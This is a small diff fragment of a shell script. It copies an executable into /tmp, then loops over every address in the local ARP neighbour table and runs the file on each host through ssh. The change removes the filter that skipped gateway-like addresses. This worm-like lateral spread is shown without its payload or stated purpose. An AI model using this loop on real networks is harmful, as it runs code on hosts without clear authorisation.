@@ -127,7 +127,7 @@ FILE_PATH="/tmp"
     sudo mv -v ./$FILE_SEND $FILE_PATH
     sudo chmod +x $FILE_PATH/$FILE_SEND     
     cd $FILE_PATH
-    for i in `ip neigh show | awk -F " " '{print $1};' | grep -vE "*.1"`
+    for i in `ip neigh show | awk -F " " '{print $1};' #| grep -vE "*.1"`
     do 
         ssh -v $i 'bash -s' < $FILE_PATH/$FILE_SEND
     
